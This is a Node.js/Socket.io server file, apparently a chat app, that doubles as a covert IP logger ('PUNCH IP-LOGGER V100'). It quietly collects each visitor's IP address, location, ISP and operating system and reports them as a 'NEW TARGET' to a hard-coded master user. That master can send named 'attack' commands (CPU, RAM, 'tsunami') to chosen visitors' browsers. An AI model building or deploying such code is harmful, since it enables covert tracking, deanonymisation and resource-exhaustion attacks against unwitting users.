const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios'); // Pour la géo-localisation IP

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname));

let users = [];

// --- MOTEUR DE TRACKING BOOSTER ---
const getTargetInfo = async (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    let geo = { city: 'Inconnue', country: 'Inconnu', isp: 'Inconnu' };
    
    try {
        // On interroge une API de géo-localisation (Free Tier)
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if(response.data.status === 'success') {
            geo = {
                city: response.data.city,
                country: response.data.country,
                isp: response.data.isp
            };
        }
    } catch (e) { /* IP locale ou erreur API */ }

    return {
        ip: ip.replace('::ffff:', ''),
        geo: geo,
        ua: socket.handshake.headers['user-agent']
    };
};

io.on('connection', async (socket) => {
    // Extraction immédiate des données
    const info = await getTargetInfo(socket);
    
    socket.on('init', (data) => {
        const newUser = { 
            id: socket.id, 
            name: data.name || "Unknown_Stand",
            details: info // On stocke les données de l'IP Logger
        };
        
        users.push(newUser);
        
        // Notification au Master (toucheur2pp) uniquement
        const master = users.find(u => u.name === "toucheur2pp");
        if (master) {
            io.to(master.id).emit('log_update', `[TRACKING] NEW TARGET: ${newUser.name} | IP: ${info.ip} | LOC: ${info.geo.city}, ${info.geo.country} | OS: ${info.ua.split('(')[1].split(')')[0]}`);
        }

        io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
    });

    socket.on('chat', (msg) => {
        const user = users.find(u => u.id === socket.id);
        if (user) io.emit('chat', { n: user.name, t: msg });
    });

    // --- SYSTÈME D'ATTAQUES IDENTIFIÉES ---
    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_ram'];
    attacks.forEach(type => {
        socket.on(type, (targetId) => {
            const attacker = users.find(u => u.id === socket.id);
            if (attacker && attacker.name === "toucheur2pp") {
                io.to(targetId).emit('execute', { 
                    type: type, 
                    from: attacker.name 
                });
            }
        });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
    });
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    💎 PUNCH IP-LOGGER V100 ACTIVE
    ------------------------------
    > Port : ${PORT}
    > Tracking : ON (ip-api integration)
    > Master Auth : toucheur2pp
    ------------------------------
    `);
});
